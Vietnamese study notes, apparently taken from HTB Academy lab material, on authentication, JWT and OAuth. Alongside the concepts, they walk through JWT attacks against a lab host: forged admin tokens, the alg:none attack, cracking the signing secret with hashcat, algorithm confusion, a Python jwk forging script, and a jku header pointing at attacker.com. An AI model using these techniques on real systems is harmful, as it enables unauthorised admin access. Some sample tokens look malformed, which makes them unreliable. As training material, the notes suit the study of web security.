**Giải thích đơn giản với ví dụ về cơ chế xác thực (Authentication Mechanisms):**

### 1. **Cơ chế xác thực và ủy quyền (Authentication vs. Authorization)**

**Xác thực (Authentication):**
- Là quá trình kiểm tra danh tính của người dùng.
- Ví dụ: Khi bạn đăng nhập vào một trang web, bạn nhập tên người dùng và mật khẩu để chứng minh bạn là ai.

**Ủy quyền (Authorization):**
- Là quá trình kiểm soát quyền truy cập của người dùng sau khi đã xác thực.
- Ví dụ: Sau khi đăng nhập, nếu bạn là admin, bạn có quyền chỉnh sửa nội dung; còn nếu bạn là người dùng thường, bạn chỉ có thể xem nội dung.

**Ví dụ minh họa:**
- Bạn vào một tòa nhà (xác thực): Bạn phải xuất trình thẻ nhân viên để bảo vệ kiểm tra danh tính.
- Sau khi vào bên trong (ủy quyền): Nếu bạn là nhân viên phòng IT, bạn có thể vào phòng máy chủ; nếu bạn là nhân viên văn phòng, bạn chỉ có thể vào khu vực làm việc chung.

### 2. **Những cơ chế kiểm soát truy cập phổ biến:**

- **Discretionary Access Control (DAC):** Người dùng có thể cấp quyền cho người khác dựa trên ý muốn cá nhân.
- **Mandatory Access Control (MAC):** Quyền truy cập được kiểm soát bởi chính sách an ninh, không thể thay đổi bởi người dùng.
- **Role-Based Access Control (RBAC):** Quyền truy cập dựa trên vai trò (như admin, người dùng thường).
- **Attribute-Based Access Control (ABAC):** Quyền truy cập dựa trên thuộc tính của người dùng (như vị trí, thời gian truy cập).

**Ví dụ RBAC:**
- Admin có quyền chỉnh sửa và xóa bài viết.
- Người dùng thường chỉ có quyền xem bài viết.

### 3. **Broken Authentication (Xác thực không an toàn):**

Khi cơ chế xác thực được triển khai sai, sẽ dễ dàng bị tấn công, gây ra các lỗ hổng bảo mật.

**Ví dụ về tấn công:**
- **Brute-forcing:** Hacker thử nhiều tên người dùng và mật khẩu để đoán đúng thông tin đăng nhập.
- **JWT Manipulation:** Hacker thay đổi nội dung của JSON Web Token để truy cập trái phép.

### 4. **JSON Web Token (JWT):**

**JWT là gì?**
- JWT là một định dạng token để truyền dữ liệu một cách an toàn.
- **Cấu trúc:** Gồm 3 phần: Header (thông tin về thuật toán), Payload (dữ liệu), và Signature (chữ ký).

**Ví dụ về JWT:**
```json
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdHVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.s3cr3tsignatur3
```
- Nếu hacker có thể thay đổi phần Payload (ví dụ thay "role" thành "admin"), họ có thể truy cập trái phép vào hệ thống.

### 5. **OAuth (Open Authorization):**

- **OAuth là gì?** Một giao thức mở cho phép cấp quyền truy cập giữa các dịch vụ mà không cần chia sẻ mật khẩu của người dùng.
- **Ví dụ:** Khi bạn đăng nhập vào một ứng dụng bằng tài khoản Google, OAuth sẽ cấp quyền cho ứng dụng mà không cần tiết lộ mật khẩu của bạn.

**Luồng hoạt động của OAuth:**
1. Ứng dụng yêu cầu quyền truy cập từ người dùng.
2. Người dùng đồng ý cấp quyền.
3. Ứng dụng nhận được token truy cập và sử dụng nó để truy cập thông tin của người dùng.

### 6. **SAML (Secure Assertion Markup Language):**

- **SAML là gì?** Một chuẩn mở dựa trên XML để trao đổi dữ liệu xác thực và ủy quyền giữa nhà cung cấp danh tính (IdP) và nhà cung cấp dịch vụ (SP).
- **Ví dụ:** Trong một tổ chức, khi bạn đăng nhập một lần vào hệ thống, bạn có thể truy cập các ứng dụng khác mà không cần đăng nhập lại (Single Sign-On).

**Luồng hoạt động của SAML:**
1. Người dùng yêu cầu truy cập dịch vụ.
2. IdP xác thực danh tính người dùng và tạo một thông báo xác thực.
3. SP nhận thông báo này, kiểm tra chữ ký và cấp quyền truy cập cho người dùng.

---
### **Giới thiệu về JWT (JSON Web Token)**

**JWT là gì?**
- JWT là một dạng token dùng để truyền dữ liệu một cách an toàn giữa các bên. JWT có thể chứa thông tin về người dùng, thông tin xác thực và ủy quyền.
- JWT thường được sử dụng trong các ứng dụng web như một **token xác thực không trạng thái** (stateless token).

### **Cấu trúc của JWT**
JWT bao gồm 3 phần chính, được phân tách bởi dấu chấm (`.`):
1. **Header**: Chứa thông tin về thuật toán mã hóa và loại token.
2. **Payload**: Chứa dữ liệu (claims) về người dùng hoặc phiên làm việc.
3. **Signature**: Là chữ ký để đảm bảo tính toàn vẹn của token.

Ví dụ về JWT:
```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJIVEItQWNhZGVteSIsInVzZXIiOiJhZG1pbiIsImlzQWRtaW4iOnRydWV9.Chnhj-ATkcOfjtn8GCHYvpNE-9dmlhKTCUwl6pxTZEA
```

### **1. Header**
Header chứa thông tin về loại token và thuật toán mã hóa. Thường sẽ có hai thuộc tính:
- **`typ`**: Thường là `"JWT"`.
- **`alg`**: Chỉ định thuật toán mã hóa, ví dụ `"HS256"`.

**Ví dụ về Header (sau khi giải mã Base64):**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Các giá trị thuật toán phổ biến:**
- **HS256**: HMAC với SHA-256.
- **RS256**: RSA với SHA-256.
- **none**: Không có chữ ký (không nên sử dụng vì dễ bị tấn công).

### **2. Payload**
Payload chứa dữ liệu chính của token, bao gồm các **claims**:
- **Registered claims**: Là các claims đã được chuẩn hóa, ví dụ:
  - **`iss`** (Issuer): Nguồn phát hành token.
  - **`sub`** (Subject): Đối tượng của token.
  - **`exp`** (Expiration Time): Thời gian hết hạn của token.
- **User-defined claims**: Các claims do người dùng tự định nghĩa, ví dụ:
  - **`user`**: Tên người dùng.
  - **`isAdmin`**: Xác định vai trò người dùng.

**Ví dụ về Payload (sau khi giải mã Base64):**
```json
{
  "iss": "HTB-Academy",
  "user": "admin",
  "isAdmin": true
}
```

### **3. Signature**
Chữ ký được tạo ra bằng cách mã hóa kết hợp giữa Header và Payload với một **secret key** và thuật toán đã chỉ định trong Header.
- **Công thức tạo Signature:**
```text
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)
```

Chữ ký giúp đảm bảo tính toàn vẹn của token. Nếu Header hoặc Payload bị thay đổi, chữ ký sẽ không hợp lệ.

### **Ví dụ về JWT hoàn chỉnh:**
```text
Header.Payload.Signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJIVEItQWNhZGVteSIsInVzZXIiOiJhZG1pbiIsImlzQWRtaW4iOnRydWV9.Chnhj-ATkcOfjtn8GCHYvpNE-9dmlhKTCUwl6pxTZEA
```

### **Xác thực dựa trên JWT (JWT-based Authentication)**

#### **Stateful Authentication (Xác thực có trạng thái)**
- Truyền thống, khi người dùng đăng nhập, server sẽ tạo một session token và lưu trữ trên cơ sở dữ liệu. Server cần giữ trạng thái của phiên làm việc (session state).
- **Nhược điểm:** Yêu cầu lưu trữ session trên server, không hiệu quả khi số lượng người dùng lớn.

#### **Stateless Authentication (Xác thực không trạng thái)**
- JWT chứa toàn bộ thông tin cần thiết về người dùng. Sau khi đăng nhập, server sẽ trả về một JWT cho client.
- Khi client gửi yêu cầu, server chỉ cần kiểm tra chữ ký của JWT để xác thực mà không cần truy vấn cơ sở dữ liệu.
- **Ưu điểm:** Không cần lưu trạng thái, dễ dàng mở rộng (scalable).
- **Nhược điểm:** Nếu JWT bị đánh cắp, hacker có thể sử dụng nó trong suốt thời gian token còn hiệu lực.

### **Ví dụ minh họa về Stateless Authentication:**
1. Người dùng đăng nhập và nhận được JWT.
2. Client lưu JWT (thường ở localStorage hoặc cookies).
3. Khi người dùng gửi yêu cầu API, JWT được gửi kèm theo.
4. Server kiểm tra chữ ký của JWT để xác thực và xử lý yêu cầu.

**Lưu ý:** JWT cần có thời gian hết hạn (`exp`) để tránh việc token bị lợi dụng quá lâu nếu bị đánh cắp.

---
### **Tấn công vào cơ chế xác minh chữ ký của JWT (Attacking Signature Verification)**

#### **1. Bảo vệ dữ liệu bằng chữ ký của JWT**
Chữ ký của JWT đóng vai trò quan trọng trong việc đảm bảo tính toàn vẹn của dữ liệu trong JWT. Chữ ký được tạo từ phần **Header** và **Payload**, sau đó mã hóa bằng một khóa bí mật (secret key). Nếu bất kỳ phần nào trong JWT bị thay đổi, chữ ký sẽ không còn khớp, và server sẽ từ chối JWT này.

#### **2. Lỗ hổng: Thiếu xác minh chữ ký (Missing Signature Verification)**
Trong một số trường hợp, nếu ứng dụng web **không kiểm tra chữ ký** của JWT, hacker có thể dễ dàng chỉnh sửa nội dung Payload và gửi lại token mà không bị phát hiện.

**Ví dụ minh họa:**
- Một trang web có chức năng đăng nhập và sử dụng JWT làm session cookie.
- Sau khi đăng nhập, người dùng nhận được JWT như sau:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6ZmFsc2UsImV4cCI6MTcxMTE4NjA0NH0.ecpzHiyA5I1-KYTTF251bUiUMtNnrIMwvHeSZf0eB0
```

**Payload sau khi giải mã:**
```json
{
  "user": "htb-stdnt",
  "isAdmin": false,
  "exp": 1711186044
}
```

- Người dùng nhận thấy claim `"isAdmin": false`. Hacker có thể lợi dụng điểm này để thay đổi `"isAdmin": true` và tạo lại JWT với nội dung mới.

**Payload mới:**
```json
{
  "user": "htb-stdnt",
  "isAdmin": true,
  "exp": 1711186044
}
```

- Sau khi chỉnh sửa, hacker có thể sử dụng công cụ như **jwt.io** để mã hóa lại JWT.
- Nếu ứng dụng không kiểm tra chữ ký, token mới sẽ được server chấp nhận và hacker sẽ có quyền admin.

**Yêu cầu HTTP với JWT đã chỉnh sửa:**
```http
GET /home HTTP/1.1
Host: 172.17.0.2
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6dHJ1ZSwiZXhwIjoxNzExMTg2MDQ0fQ.S85PjpnL6BNhBCWk6OYDHc_XjfWogMJV8wq5pKJ6Tv4
```

- **Kết quả:** Server cấp quyền admin cho hacker do không kiểm tra chữ ký.

#### **3. Tấn công sử dụng thuật toán "none" (None Algorithm Attack)**
Thuật toán `"none"` trong JWT có nghĩa là không có chữ ký. Nếu ứng dụng chấp nhận thuật toán `"none"`, hacker có thể tạo JWT mà không cần chữ ký.

**Ví dụ minh họa:**
1. Hacker tạo JWT mới với Header:
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

2. Payload:
```json
{
  "user": "htb-stdnt",
  "isAdmin": true,
  "exp": 1711186044
}
```

3. JWT hoàn chỉnh:
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6dHJ1ZSwiZXhwIjoxNzExMTg2MDQ0fQ.
```

- **Yêu cầu HTTP với JWT sử dụng thuật toán "none":**
```http
GET /home HTTP/1.1
Host: 172.17.0.2
Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6dHJ1ZSwiZXhwIjoxNzExMTg2MDQ0fQ.
```

- **Kết quả:** Nếu server không kiểm tra chữ ký, hacker sẽ được cấp quyền admin.

**Lưu ý:** Dù JWT sử dụng thuật toán `"none"`, phần cuối cùng vẫn phải có dấu chấm (`.`) để đảm bảo định dạng JWT hợp lệ.

---
### **Tấn công vào khóa bí mật ký JWT (Attacking the Signing Secret)**

#### **1. Ý tưởng tấn công**
Khóa bí mật (signing secret) được sử dụng để tạo chữ ký cho JWT nhằm đảm bảo tính toàn vẹn của token. Nếu hacker biết được khóa bí mật này, họ có thể tạo ra JWT hợp lệ mà không cần phải bypass cơ chế xác minh chữ ký. Trong một số trường hợp, hacker có thể sử dụng phương pháp brute-force để tìm ra khóa bí mật nếu nó quá yếu hoặc dễ đoán.

#### **2. Các thuật toán ký JWT phổ biến**
JWT hỗ trợ các thuật toán ký đối xứng phổ biến sau, dựa trên khóa bí mật:
- **HS256**: HMAC với SHA-256.
- **HS384**: HMAC với SHA-384.
- **HS512**: HMAC với SHA-512.

#### **3. Lấy JWT hợp lệ**
Hacker sẽ cần một JWT hợp lệ từ ứng dụng web, thường bằng cách đăng nhập hoặc thu thập từ yêu cầu HTTP.

**Ví dụ về JWT hợp lệ:**
```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6ZmFsc2UsImV4cCI6MTcxMTIwNDYzN30.r_rYB0tvuiA2scNQrmzBaMAG2rkGdMu9cGMEEl3WTW0
```

#### **4. Kiểm tra thuật toán ký**
Hacker có thể kiểm tra thuật toán ký được sử dụng bằng cách giải mã phần **Header** của JWT. Trong ví dụ trên, thuật toán ký là **HS256**.

**Header sau khi giải mã:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

#### **5. Tấn công brute-force khóa bí mật**
Hacker có thể sử dụng công cụ như **hashcat** để brute-force khóa bí mật của JWT.

**Chuẩn bị JWT cho hashcat:**
```bash
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6ZmFsc2UsImV4cCI6MTcxMTIwNDYzN30.r_rYB0tvuiA2scNQrmzBaMAG2rkGdMu9cGMEEl3WTW0" > jwt.txt
```

**Chạy hashcat với wordlist (ví dụ: rockyou.txt):**
```bash
hashcat -m 16500 jwt.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

**Kết quả của hashcat:**
```text
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaH...l3WTW0
Time.Started.....: Sat Mar 23 15:24:17 2024 (2 secs)
Speed.#1.........:  3475.1 kH/s
Recovered........: 1/1 (100.00%)
Candidates.#1....: rb270990 -> rayruben1
```

Trong ví dụ này, hashcat đã tìm ra khóa bí mật là **"rayruben1"**.

#### **6. Tạo JWT giả mạo (Forging a Token)**
Khi hacker đã biết được khóa bí mật, họ có thể tạo ra JWT giả mạo mà vẫn hợp lệ.

**Payload mới:**
```json
{
  "user": "htb-stdnt",
  "isAdmin": true,
  "exp": 1711186044
}
```

**Tạo JWT mới bằng cách sử dụng khóa bí mật "rayruben1" trên jwt.io:**
- Dán Payload vào jwt.io.
- Chọn thuật toán là **HS256** và nhập khóa bí mật là "rayruben1".
- jwt.io sẽ tự động tạo ra JWT với chữ ký hợp lệ.

**JWT giả mạo:**
```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6dHJ1ZSwiZXhwIjoxNzExMTIwNDYzN30.s3cr3tsignatur3
```

#### **7. Sử dụng JWT giả mạo**
Hacker có thể sử dụng JWT mới này để gửi yêu cầu HTTP và có quyền truy cập admin.

**Yêu cầu HTTP:**
```http
GET /home HTTP/1.1
Host: 172.17.0.2
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6dHJ1ZSwiZXhwIjoxNzExMTIwNDYzN30.s3cr3tsignatur3
```

**Kết quả:** Hacker có quyền truy cập admin vào ứng dụng web.

---
### **Tấn công kiểu nhầm lẫn thuật toán (Algorithm Confusion Attack)**

#### **1. Khái niệm về tấn công nhầm lẫn thuật toán**
Nhầm lẫn thuật toán là một kiểu tấn công vào JWT nhằm ép buộc ứng dụng web sử dụng một thuật toán khác để kiểm tra chữ ký của JWT, khác với thuật toán được sử dụng để tạo chữ ký. Điều này đặc biệt xảy ra khi ứng dụng web chấp nhận bất kỳ thuật toán nào được chỉ định trong phần **`alg`** của JWT mà không kiểm tra chặt chẽ.

#### **2. Sự khác biệt giữa thuật toán đối xứng và bất đối xứng**
- **Thuật toán đối xứng (Symmetric Algorithm)**: Ví dụ như **HS256**, sử dụng cùng một khóa bí mật để ký và xác minh JWT.
- **Thuật toán bất đối xứng (Asymmetric Algorithm)**: Ví dụ như **RS256**, sử dụng **khóa riêng (private key)** để ký và **khóa công khai (public key)** để xác minh.

**Lỗ hổng xảy ra khi:**
- Ứng dụng web sử dụng thuật toán bất đối xứng (RS256) để tạo JWT, nhưng lại chấp nhận kiểm tra JWT bằng thuật toán đối xứng (HS256).
- Hacker có thể tạo JWT giả mạo bằng khóa công khai (public key), vốn không được bảo mật và có thể dễ dàng thu thập.

#### **3. Cách thực hiện tấn công Algorithm Confusion**
**Bước 1: Lấy JWT hợp lệ**
- Hacker cần một JWT hợp lệ từ ứng dụng web, thường có thuật toán là **RS256** (sử dụng bất đối xứng).
- Ví dụ về JWT:
```text
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6ZmFsc2UsImV4cCI6MTcxMTI3MTkyOX0.<signature>
```

**Bước 2: Lấy khóa công khai**
- Khóa công khai thường được công khai trên website hoặc có thể được trích xuất từ chính JWT nếu biết các công cụ thích hợp.
- Hacker có thể sử dụng công cụ **rsa_sign2n** để tính toán khóa công khai từ các JWT đã thu thập được.

**Cách sử dụng `rsa_sign2n`:**
```bash
git clone https://github.com/silentsignal/rsa_sign2n
cd rsa_sign2n/standalone/
docker build . -t sig2n
docker run -it sig2n /bin/bash
```

- Hacker cung cấp cho công cụ hai JWT khác nhau được ký bởi cùng một khóa riêng. Công cụ sẽ tính toán và xuất ra khóa công khai.

**Ví dụ kết quả:**
```text
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsZaSaPDmaxyds/NMppno
dUEWomQEdu+p57T4B7tjCZp0nRQk1HnOR8LuTztHn6U4ZKEHvHWGF7PxHHgtxrTb
7uhbwhsu3XVTcd1c/S2G9TCvW4WaF8uqNjgzUJEANsABGXHSVCuM7CLf2jWjVyWX
6w4dbyK3LNHvt/tkJspeGwx3wT1Gq2RpQ6n0+J/q6vxKBAc4z9QuzfgLPpnZFdYj
kZyJimyFmiyPDP6k2MZYr6rgiuUhCQQlFBL8yS94dITAoZhGIJDtNW9WDV7gOB8t
OgPrAdBM2rm8SmlNjsaHxIDec2E+qafCm8VnwSLXHXb9IDvLSTCqI+gOSJEGgTuT
VQIDAQAB
-----END PUBLIC KEY-----
```

**Bước 3: Tạo JWT giả mạo với HS256**
- Hacker tạo JWT giả mạo nhưng chỉ định thuật toán là **HS256** thay vì **RS256**.
- Họ sử dụng công cụ như **CyberChef**:
  - Chọn **JWT Sign**.
  - Đặt thuật toán là **HS256**.
  - Sử dụng khóa công khai như là khóa bí mật (secret key).

**Payload của JWT mới:**
```json
{
  "user": "htb-stdnt",
  "isAdmin": true,
  "exp": 1711186044
}
```

- JWT giả mạo sau khi ký:
```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogdHJ1ZSwiZXhwIjoxNzExMzU2NTczfQ.Dq6bu6oNyTKStTD6YycB9EzmXoTiMJ9aKu_nNMLx7RM
```

**Bước 4: Gửi JWT giả mạo đến ứng dụng web**
- Hacker gửi JWT giả mạo trong yêu cầu HTTP để chiếm quyền admin.

**Yêu cầu HTTP:**
```http
GET /admin HTTP/1.1
Host: 172.17.0.2
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogdHJ1ZSwiZXhwIjoxNzExMzU2NTczfQ.Dq6bu6oNyTKStTD6YycB9EzmXoTiMJ9aKu_nNMLx7RM
```

- **Kết quả:** Ứng dụng web chấp nhận JWT giả mạo và cấp quyền admin cho hacker.

---
### **Các tấn công khác vào JWT (Further JWT Attacks)**

#### **1. Reusing JWT Secrets (Tái sử dụng khóa bí mật)**
Một trong những lỗ hổng phổ biến là việc **tái sử dụng khóa bí mật** cho nhiều ứng dụng web khác nhau. Nếu các ứng dụng chia sẻ cùng một khóa bí mật để ký JWT, hacker có thể lợi dụng JWT từ một ứng dụng này để truy cập vào ứng dụng khác.

**Ví dụ:**
- Công ty sở hữu hai trang mạng xã hội: **socialA.htb** và **socialB.htb**.
- Người dùng có vai trò **moderator** trên **socialA**, nhưng chỉ là người dùng bình thường trên **socialB**.
- JWT trên **socialA** chứa claim `"role": "moderator"`:
  ```json
  {
    "user": "exampleUser",
    "role": "moderator"
  }
  ```
- Nếu cả hai ứng dụng sử dụng cùng một khóa bí mật, hacker có thể sử dụng JWT từ **socialA** trên **socialB** để truy cập quyền **moderator**.

**Phòng chống:**
- Mỗi ứng dụng phải có khóa bí mật riêng biệt để ký JWT.
- Không chia sẻ khóa bí mật giữa các dịch vụ khác nhau.

#### **2. Exploiting the `jwk` Claim**
**Claim `jwk`** chứa thông tin về khóa công khai dùng để xác minh JWT. Nếu ứng dụng web chấp nhận bất kỳ khóa công khai nào được cung cấp trong claim `jwk`, hacker có thể tạo ra JWT giả mạo và cung cấp khóa công khai của riêng họ trong claim `jwk`.

**Cách thực hiện tấn công:**
1. Tạo cặp khóa riêng và khóa công khai:
   ```bash
   openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
   openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem
   ```

2. Sử dụng khóa riêng để ký JWT và chèn khóa công khai vào claim `jwk`.

**Script Python tự động khai thác:**
```python
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from jose import jwk
import jwt

# Payload của JWT
jwt_payload = {'user': 'htb-stdnt', 'isAdmin': True}

# Chuyển đổi PEM thành JWK
with open('exploit_public.pem', 'rb') as f:
    public_key_pem = f.read()
    public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
    jwk_key = jwk.construct(public_key, algorithm='RS256')
    jwk_dict = jwk_key.to_dict()

# Ký JWT
with open('exploit_private.pem', 'rb') as f:
    private_key_pem = f.read()
    token = jwt.encode(jwt_payload, private_key_pem, algorithm='RS256', headers={'jwk': jwk_dict})

print(token)
```

**Kết quả:**
JWT giả mạo sẽ chứa khóa công khai của hacker trong claim `jwk`, và ứng dụng web sẽ chấp nhận token này vì chữ ký hợp lệ.

**Phòng chống:**
- Không chấp nhận claim `jwk` từ người dùng.
- Chỉ sử dụng khóa công khai cố định từ cấu hình của server.

#### **3. Exploiting the `jku` Claim**
Claim **`jku`** chứa URL đến một tập hợp các khóa công khai được mã hóa JSON Web Key (JWK Set). Hacker có thể lợi dụng claim này bằng cách đặt URL trỏ đến server của họ và cung cấp khóa công khai giả mạo.

**Quy trình tấn công:**
1. Hacker tạo server chứa JWK Set với khóa công khai của họ.
2. Tạo JWT giả mạo với claim `jku` trỏ đến URL của hacker:
   ```json
   {
     "alg": "RS256",
     "jku": "https://attacker.com/jwks.json"
   }
   ```

3. Nếu ứng dụng web không kiểm tra nguồn gốc URL, nó sẽ truy vấn URL của hacker để lấy khóa công khai và xác minh JWT giả mạo.

**Phòng chống:**
- Chỉ chấp nhận các URL trong claim `jku` từ nguồn tin cậy.
- Kiểm tra chặt chẽ URL và sử dụng TLS để đảm bảo an toàn.

#### **4. Blind Server Side Request Forgery (SSRF) thông qua `jku` Claim**
Claim `jku` có thể được lợi dụng để thực hiện tấn công **SSRF mù** nếu ứng dụng web không kiểm tra kỹ URL. Hacker có thể đặt URL trỏ đến một server nội bộ mà hacker không thể truy cập trực tiếp, từ đó ép buộc server thực hiện yêu cầu GET đến server nội bộ.


#### **5. Các Claims khác có thể khai thác**
- **`x5c` và `x5u` Claims**: Cung cấp thông tin về chứng chỉ hoặc chuỗi chứng chỉ. Tấn công vào các claim này tương tự như `jwk` và `jku`.
- **`kid` Claim**: Xác định khóa được sử dụng để ký JWT. Nếu ứng dụng xử lý claim này không đúng cách, có thể dẫn đến các lỗ hổng như **path traversal**, **SQL injection**, hoặc **command injection**.

---
### **Công cụ và cách phòng tránh lỗ hổng JWT (Tools of the Trade & Vulnerability Prevention)**

#### **1. Công cụ thường dùng để khai thác JWT (Tools of the Trade)**

Một trong những công cụ phổ biến nhất cho việc kiểm tra và khai thác lỗ hổng JWT là **jwt_tool**. Đây là một công cụ mạnh mẽ giúp phân tích, kiểm tra và khai thác các lỗ hổng liên quan đến JWT.

**Cài đặt `jwt_tool`:**
```bash
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r jwt_tool/requirements.txt
```

Sau khi cài đặt, bạn có thể chạy công cụ bằng lệnh:
```bash
python3 jwt_tool/jwt_tool.py
```

**Các tính năng nổi bật của `jwt_tool`:**
- Phân tích JWT.
- Brute-force khóa bí mật của JWT.
- Tấn công các lỗ hổng phổ biến như `alg: none`, JWKS spoofing, và key confusion.

**Ví dụ: Phân tích JWT với `jwt_tool`:**
```bash
python3 jwt_tool/jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6ZmFsc2UsImV4cCI6MTcxMTE4NjA0NH0.ecpzHiyA5I1-KYTTF251bUiUMtNnrIMwvHeSZf0eB0
```

**Kết quả phân tích:**
- Header:
  ```json
  {
    "alg": "HS256",
    "typ": "JWT"
  }
  ```
- Payload:
  ```json
  {
    "user": "htb-stdnt",
    "isAdmin": false,
    "exp": 1711186044
  }
  ```
- Token đã hết hạn (timestamp trong claim `exp` đã qua).

#### **2. Khai thác JWT bằng `jwt_tool`**

**Ví dụ: Tấn công `alg: none`**
JWT với thuật toán `none` có thể dễ dàng bị khai thác nếu ứng dụng chấp nhận JWT mà không có chữ ký.

```bash
python3 jwt_tool/jwt_tool.py -X a -pc isAdmin -pv true -I eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbmI6ZmFsc2UsImV4cCI6MTcxMTE4NjA0NH0.ecpzHiyA5I1-KYTTF251bUiUMtNnrIMwvHeSZf0eB0
```

- `-X a`: Sử dụng tấn công `alg: none`.
- `-pc isAdmin -pv true`: Thay đổi claim `isAdmin` thành `true`.
- `-I`: Đầu vào là JWT hợp lệ.

**Kết quả:**
JWT mới sẽ có claim `"alg": "none"`, cho phép bỏ qua xác minh chữ ký.

---
---
### **Giới thiệu về OAuth**

**OAuth** là một giao thức cho phép ủy quyền an toàn giữa các dịch vụ mà không cần chia sẻ thông tin đăng nhập của người dùng. OAuth thường được sử dụng trong các tình huống **Single Sign-On (SSO)**, cho phép người dùng đăng nhập vào một dịch vụ và truy cập nhiều dịch vụ khác nhau.

#### **Các thành phần chính trong OAuth**
1. **Resource Owner (Chủ sở hữu tài nguyên)**: Thường là người dùng.
2. **Client (Ứng dụng khách)**: Dịch vụ yêu cầu quyền truy cập tài nguyên thay mặt cho người dùng.
3. **Authorization Server (Máy chủ ủy quyền)**: Máy chủ xác thực người dùng và phát hành token truy cập cho client.
4. **Resource Server (Máy chủ tài nguyên)**: Máy chủ lưu trữ tài nguyên mà client muốn truy cập.

#### **Luồng giao tiếp trong OAuth**
1. Client yêu cầu quyền ủy quyền từ người dùng.
2. Người dùng cấp quyền ủy quyền cho client.
3. Client gửi yêu cầu ủy quyền đến máy chủ ủy quyền.
4. Máy chủ ủy quyền phát hành token truy cập cho client.
5. Client gửi token truy cập đến máy chủ tài nguyên.
6. Máy chủ tài nguyên xác thực token và cung cấp tài nguyên cho client.

### **Ví dụ minh họa về OAuth**
Giả sử:
- **Resource Owner**: Người dùng tên John.
- **Client**: Nền tảng đào tạo an ninh mạng `academy.htb`.
- **Authorization Server và Resource Server**: `hubgit.htb`.

#### **Luồng thực hiện:**
1. John truy cập `academy.htb` và chọn đăng nhập bằng tài khoản `hubgit.htb`.
2. John đăng nhập vào `hubgit.htb` và chấp thuận cho `academy.htb` truy cập thông tin hồ sơ của mình.
3. `hubgit.htb` phát hành một mã ủy quyền (authorization code) cho `academy.htb`.
4. `academy.htb` gửi mã ủy quyền này đến `hubgit.htb` để yêu cầu token truy cập.
5. `hubgit.htb` xác nhận mã ủy quyền và cấp token truy cập cho `academy.htb`.
6. `academy.htb` sử dụng token truy cập để yêu cầu thông tin hồ sơ của John từ `hubgit.htb`.

### **Các loại Grant phổ biến trong OAuth**
#### **1. Authorization Code Grant (Grant mã ủy quyền)**
Đây là loại grant phổ biến và an toàn nhất.

**Bước 1: Yêu cầu ủy quyền**
```http
GET /auth?client_id=1337&redirect_uri=http://academy.htb/callback&response_type=code&scope=user&state=a45c12e87d4522 HTTP/1.1
Host: hubgit.htb
```

**Bước 2: Xác thực người dùng**
- John đăng nhập và chấp thuận quyền truy cập.

**Bước 3: Nhận mã ủy quyền**
- `hubgit.htb` chuyển hướng trình duyệt đến URL callback của `academy.htb` với mã ủy quyền:
```http
GET /callback?code=ptsmyq2zxyvv23bl&state=a45c12e87d4522 HTTP/1.1
Host: academy.htb
```

**Bước 4: Yêu cầu token truy cập**
```http
POST /token HTTP/1.1
Host: hubgit.htb
client_id=1337&client_secret=SECRET&redirect_uri=http://academy.htb/callback&grant_type=authorization_code&code=ptsmyq2zxyvv23bl
```

**Bước 5: Nhận token truy cập**
```json
{
  "access_token": "RsT5OjbzRn430zqMLgV3Ia",
  "expires_in": 3600
}
```

**Bước 6: Yêu cầu tài nguyên**
```http
GET /user_info HTTP/1.1
Host: hubgit.htb
Authorization: Bearer RsT5OjbzRn430zqMLgV3Ia
```

**Bước 7: Phản hồi tài nguyên**
```json
{
  "username": "john",
